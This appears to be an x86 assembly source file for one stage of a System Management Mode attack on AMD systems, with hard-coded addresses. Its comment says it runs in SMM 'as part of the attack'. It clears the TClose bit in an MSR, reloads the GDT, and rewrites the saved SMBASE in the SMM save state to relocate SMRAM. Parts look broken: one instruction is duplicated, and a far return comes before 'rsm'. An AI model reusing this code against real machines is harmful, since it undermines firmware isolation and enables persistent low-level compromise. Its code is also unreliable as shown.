

#define PROTECT_MODE_CS 0x08
#define PROTECT_MODE_DS 0x20
#define LONG_MODE_CS 	0x38
#define TSS_SEGMENT 	0x40
#define LONG_MODE_DS	0x48

#define ORIGINAL_GDTR			0x1400
#define SQUIRREL_BAR 			0xd0800000
#define CORE0_INITIAL_STACK		0x1E00
#define CORE0_PAGE_TABLE_BASE   0x2000
#define CORE0_NEXT_STAGE        0x1031
#define CORE0_LONG_MODE	        0x1081 /* 0x1081 */

#define CORE0_LONG_MODE_JMP 	0x1081

#define SMM_BASE_OFFSET_CORE0 	0xafe39000

#define CORE0_NEW_SMM_BASE		0x76000000


#define X64_STAGING_FUNC_VA		0xfffff6fb7dbee000
#define X64_STAGING_RSP			0xfffff6fb7dbef000

#define IA32_EFER				0xC0000080

#define CORE1_MUTEX_SIGNAL_ADDR	0x3220

.global _core0_shell


.text
/* This code is executed in SMM by Core0 as part of the attack */
_core0_shell:
	.code32
	/* Clear TClose */
	movl $0xc0010113,%ecx
	rdmsr
	and $0xfffffff3,%eax
	wrmsr

	movl    $PROTECT_MODE_DS,%eax
	movl    %eax, %ds
	movl    %eax, %es
	movl    %eax, %fs
	movl    %eax, %gs
	movl    %eax, %ss
    movl	$CORE0_INITIAL_STACK,%esp  

	/* Clean the GDT and CS */
	movl 	$ORIGINAL_GDTR,%ecx
	lgdt  	(%ecx)

	pushl	$PROTECT_MODE_CS
    movl 	$CORE0_NEXT_STAGE,%eax
	pushl 	%eax

	lretl

next_stage:

    jmp     ProtFlatMode

ProtFlatMode:

	mov   	$SMM_BASE_OFFSET_CORE0+0xFF00,%ecx
	mov  	$CORE0_NEW_SMM_BASE,(%ecx)
	mov  	(%ecx), %ebx
	mov  	%ebx, (0x800)

	mov   	$SMM_BASE_OFFSET_CORE0+0xFEFC,%ecx
	mov  	(%ecx), %ecx
	mov  	%ecx, (0x804)	
	
	mov   	$SMM_BASE_OFFSET_CORE0+0xFF78,%ecx
	mov  	(%ecx), %ecx
	mov  	%ecx, (0x808)
	mov   	$SMM_BASE_OFFSET_CORE0+0xFF7c,%ecx
	mov   	$SMM_BASE_OFFSET_CORE0+0xFF7c,%ecx
	mov  	(%ecx), %ecx
	mov  	%ecx, (0x80c)

	retf
	/* Return from SMM*/
	rsm

	nop
	nop
	nop
	nop
	.byte 'I'
	.byte 'O'
	.byte 'A'	
	nop
	nop
	nop
	nop
	nop

